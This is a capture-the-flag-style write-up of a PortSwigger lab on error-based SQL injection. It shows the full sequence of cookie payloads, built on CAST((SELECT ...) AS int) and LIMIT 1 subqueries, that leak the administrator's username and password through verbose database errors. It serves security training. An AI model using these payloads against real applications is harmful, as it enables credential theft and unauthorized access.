## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/75b1abf1-d2a6-46c7-adeb-bbeedd147507)

## Solution :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/7191fb25-586f-4bd8-978b-a28860a600c6)

Query made - 

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '<COOKIE-VALUE>'
```

Input `'` in the TrackingID parameter since it is vulnerable.

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '<COOKIE-VALUE>''
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/43dae4bd-6b44-4a01-be27-8f02c6e247ee)

In the response, notice the verbose error message.it means the injection is likely inside a single-quoted string.To solve this in the ping request, you can use comment characters to block the rest of the query.

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '<COOKIE-VALUE>''--
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/25d233e0-5a2f-4bbc-b686-aa8b6a8eaf57)

 Now add  payload using CAST conditional expresiions.
 
 >The CAST() function to achieve this. It enables you to convert one data type to another.It is used to trick a system into showing its hidden data by making it think the data is something else

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '<COOKIE-VALUE>'' AND CAST((SELECT 1) AS int)--
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/5d5875fd-5ab4-48a6-8b8b-517736f38c4b)

error saying that an AND condition must be a boolean expression.so Modify the condition.

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '<COOKIE-VALUE>'' AND 1=CAST((SELECT 1) AS int)--
```
what happening here what ever value that `CAST((SELECT 1) AS int)` this is getting is stored in 1 and it is comparing using `And`
![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/07408029-26bd-4a0a-8984-60b3db8ab114)

This is a valid query again.

#### Check Whether the users table is present  -

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '<COOKIE-VALUE>'' AND 1=CAST((SELECT username FROM users) AS int)--
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/5c615bcc-593d-45f7-abaf-dfeb35d0ea00)

Error due to  due to a character limit .Delete or remove some of the original value of the `TrackingId= 'cookie'` to free up some space.

 ![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/f15189da-d4bc-43e7-8e4c-e43d8d4a44c9)

Again error because there more than one row returned by the subquery.Lets modify it.

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '<COOKIE-VALUE>'' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/afe108bf-32be-465e-b25e-87c456509c92)

By This  error message we can understand it leaked the first username from the users table as `administrator`

#### Finding the password 

By the error we find out that administrator is the first user in the table.I changed the qurey from `username` to `password` it will display the password of first username that is `administrator`

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '<COOKIE-VALUE>'' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/14596f34-012e-4db1-af9e-d1e514a9a86b)

password of  `administrator` is `9p8npbwszznsmfhs8anl`

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/b9f89bba-3bd1-42f1-a2be-363da01bfd5d)

successfully logged in as administrator.

